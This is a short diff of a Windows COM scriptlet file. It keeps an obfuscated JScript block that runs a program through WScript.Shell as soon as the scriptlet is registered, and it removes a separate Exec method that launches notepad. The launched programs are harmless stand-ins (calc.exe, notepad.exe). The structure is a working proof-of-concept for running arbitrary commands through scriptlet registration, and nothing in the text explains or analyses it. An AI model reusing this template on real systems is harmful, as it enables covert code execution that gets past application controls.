@@ -7,17 +7,5 @@ classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 <![CDATA[var _0xb453=["calc.exe","WScript.Shell"];var r= new ActiveXObject(_0xb453[1]).Run(_0xb453[0])]]>
 </script>
 </registration>
-<public>
-    <method name="Exec"></method>
-</public>
-<script language="JScript">
-<![CDATA[
-
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
-	}
-
-]]>
 </script>
 </scriptlet>
